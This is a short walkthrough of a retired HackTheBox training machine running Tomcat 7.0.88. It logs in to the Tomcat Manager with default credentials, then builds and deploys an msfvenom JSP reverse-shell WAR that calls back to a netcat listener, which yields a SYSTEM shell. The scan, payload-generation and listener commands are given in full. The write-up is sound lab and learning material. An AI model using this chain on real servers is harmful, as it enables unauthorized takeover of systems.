This was from when I was practicing with some retired machines from HackTheBox. It is one of the easiest machines on the hackthebox, and extremely straight-forward. There is no privilege escalation step.

### Scanning:

Finding running services:
```
crazyeights@es-base:~$ sudo nmap -sS 10.10.10.95
[sudo] password for crazyeights: 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-03 11:51 EST
Nmap scan report for 10.10.10.95
Host is up (0.033s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

### Web:

*   Tomcat 7.0.88 is running 
*   Click 'Manager App' to login as manager 
![](/assets/images/23/s1.png)
*   After incorrectly guessing the login, we see this page:
![](/assets/images/23/s2.png)
*   Trying the credentials on the page (default credentials), we get:
![](/assets/images/23/s3.png)
*   It allows for the manager to upload WARs, so we can upload a WAR containing a reverse shell    
*   Using msfvenom to create a WAR
*   Msfvenom Command Format:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST={DNS / IP / VPS IP} LPORT={PORT / Forwarded PORT} -f war > example.war
```

*   Creating the WAR:

```
crazyeights@es-base:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f war > bad.war
```

*   Start the listener:

```
crazyeights@es-base:~$ nc -lvp 1234
listening on [any] 1234 ...

```

*   Upload the file: 
![](/assets/images/23/s4.png)
*   We can now see the WAR in the list of deployed applications: 
![](/assets/images/23/s5.png)
*   Click on it in the table to visit it's location, and connect to the listener 
![](/assets/images/23/s6.png)

### Root:

*   Since we have system privileges all we need to do is get the flags:
*   Go to the directory `C:\Users\Administrator\Desktop\flags`
